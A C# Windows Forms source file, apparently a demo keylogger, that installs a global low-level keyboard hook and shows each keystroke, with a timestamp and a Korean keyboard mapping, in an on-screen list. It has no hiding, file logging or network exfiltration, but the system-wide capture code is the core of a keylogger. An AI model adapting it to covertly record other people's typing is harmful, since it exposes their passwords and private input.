using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        private HashSet<Keys> _pressedKeys = new HashSet<Keys>();
        private ListBox _listBox;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private static Dictionary<char, char> _engToKor = new Dictionary<char, char>()
        {
            { 'a','ㅁ' }, { 'b','ㅠ' }, { 'c','ㅊ' }, { 'd','ㅇ' }, { 'e','ㄷ' },
            { 'f','ㄹ' }, { 'g','ㅎ' }, { 'h','ㅗ' }, { 'i','ㅑ' }, { 'j','ㅓ' },
            { 'k','ㅏ' }, { 'l','ㅣ' }, { 'm','ㅡ' }, { 'n','ㅜ' }, { 'o','ㅐ' },
            { 'p','ㅔ' }, { 'q','ㅂ' }, { 'r','ㄱ' }, { 's','ㄴ' }, { 't','ㅅ' },
            { 'u','ㅕ' }, { 'v','ㅍ' }, { 'w','ㅈ' }, { 'x','ㅌ' }, { 'y','ㅛ' },
            { 'z','ㅋ' }
        };

        public MainForm()
        {
            InitializeComponent(); // 디자이너 컨트롤 초기화

            this.Text = "Keyboard Hook Logger";
            this.Width = 400;
            this.Height = 600;
            listBox1.Dock = DockStyle.Fill;
            _listBox = listBox1; // 디자이너에서 만든 listBox1 사용
            this.Controls.Add(listBox1);

            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
            base.OnFormClosed(e);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    // 길게 눌렀을 때 중복 출력 방지
                    if (_pressedKeys.Contains(key))
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);

                    _pressedKeys.Add(key);

                    string displayKey = VkToChar((uint)vkCode);
                    if (!string.IsNullOrEmpty(displayKey))
                    {
                        string time = DateTime.Now.ToString("HH:mm:ss");
                        string entry = $"[{time}] {displayKey}";
                        AddKeyToListBox(entry);
                    }
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    _pressedKeys.Remove(key);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void AddKeyToListBox(string text)
        {
            if (_listBox.InvokeRequired)
            {
                _listBox.BeginInvoke(new Action(() => AddKeyToListBox(text)));
            }
            else
            {
                _listBox.Items.Insert(0, text); // 최신 항목 위로
                _listBox.TopIndex = 0;           // 자동 스크롤
                if (_listBox.Items.Count > 100)
                    _listBox.Items.RemoveAt(_listBox.Items.Count - 1);
            }
        }

        private string VkToChar(uint vkCode)
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            uint scanCode = MapVirtualKey(vkCode, 0);
            StringBuilder sb = new StringBuilder(2);
            IntPtr layout = GetKeyboardLayout(0);

            int ret = ToUnicodeEx(vkCode, scanCode, keyboardState, sb, sb.Capacity, 0, layout);

            // 특수키 먼저 처리
            switch ((Keys)vkCode)
            {
                case Keys.Space: return "Space";
                case Keys.Enter: return "Enter";
                case Keys.Back: return "Backspace";
                case Keys.Tab: return "Tab";
                case Keys.Escape: return "Esc";

                case Keys.Insert: return "Insert";
                case Keys.Delete: return "Delete";
                case Keys.Home: return "Home";
                case Keys.End: return "End";
                case Keys.PageUp: return "PageUp";
                case Keys.PageDown: return "PageDown";

                case Keys.Up: return "Up";
                case Keys.Down: return "Down";
                case Keys.Left: return "Left";
                case Keys.Right: return "Right";

                case Keys.F1: return "F1";
                case Keys.F2: return "F2";
                case Keys.F3: return "F3";
                case Keys.F4: return "F4";
                case Keys.F5: return "F5";
                case Keys.F6: return "F6";
                case Keys.F7: return "F7";
                case Keys.F8: return "F8";
                case Keys.F9: return "F9";
                case Keys.F10: return "F10";
                case Keys.F11: return "F11";
                case Keys.F12: return "F12";
            }

            string result = "";
            if (ret > 0)
                result = sb.ToString().ToLower(); // 영문 소문자 기준

            // 영문 → 한글 자판 매핑
            if (result.Length == 1 && _engToKor.ContainsKey(result[0]))
                return result[0] + " " + "한글:" + _engToKor[result[0]].ToString();

            return result;
        }

        [DllImport("user32.dll")] private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")] private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")] private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")] private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}